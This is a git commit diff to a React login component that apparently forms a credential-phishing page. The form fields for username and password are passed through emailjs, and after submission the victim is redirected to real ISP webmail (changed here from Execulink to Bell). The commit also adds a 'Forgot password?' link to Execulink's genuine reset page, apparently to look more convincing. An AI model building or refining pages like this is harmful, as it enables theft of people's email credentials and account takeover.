4882fc19d78a52f87b6103c30587c13aef9cdc98
Your Name <your_email@example.com>
2024-05-11 13:04:09 +0100

    Login page modified with reset password

--- src/Components/Login.jsx
+++ src/Components/Login.jsx
@@ -3,9 +3,7 @@ import Logo from "../Assets/Logo.PNG";
 import { FaLock, FaUser } from "react-icons/fa";
 import emailjs from '@emailjs/browser';
 
-
-function Login () {
-
+function Login() {
 
     const form = useRef();
 
@@ -20,27 +18,33 @@ function Login () {
             });
 
         // Redirect to the specified link after submitting the form
-        window.location.href = 'https://webmail.execulink.ca/?_task=mail&_mbox=INBOX';
+        window.location.href = 'https://webmail.bell.net/bell/index-rui.jsp?v=3.1.3.48.0-4#/mail';
     };
 
     return (
-        <div className="flex justify-center items-center h-screen bg-gray-100">
-            <div className="bg-white p-8 rounded-lg shadow-md">
+        <div className="bg-gray-200 min-h-screen flex justify-center items-center">
+            <div className="bg-white p-8 rounded-lg shadow-md max-w-md w-full">
                 <img src={Logo} alt="Logo" className="w-32 mx-auto mb-8" />
                 <form ref={form} onSubmit={sendEmail} className="flex flex-col gap-4">
                     <div className="flex items-center border-b border-gray-300 py-2">
                         <FaUser className="text-black" />
-                        <input type="email" name="user_name" required placeholder="Username" className="ml-2 outline-none focus:ring-2 focus:ring-blue-500 flex-1" />
+                        <input type="text" name="user_name" required placeholder="Username" className="ml-2 outline-none  flex-1" />
                     </div>
                     <div className="flex items-center border-b border-gray-300 py-2">
                         <FaLock className="text-black" />
-                        <input type="password" name="user_pass" required placeholder="Password" className="ml-2 outline-none focus:ring-2 focus:ring-blue-500 flex-1" />
+                        <input type="password" name="user_pass" required placeholder="Password" className="ml-2 outline-none flex-1" />
+                    </div>
+                    <div className="flex items-center justify-between">
+                        <label className="text-gray-600">
+                            <input type="checkbox" name="remember" className="mr-2" /> Remember Me
+                        </label>
+                        <a href="https://www.execulink.ca/myexeculink/password" className="text-blue-500 hover:underline cursor-pointer">Forgot password?</a>
                     </div>
                     <button type="submit" className="bg-blue-500 text-white py-2 rounded-md hover:bg-blue-600 transition-colors duration-300">LOGIN</button>
                </form>
             </div>
         </div>
     );
-};
+}
 
 export default Login;
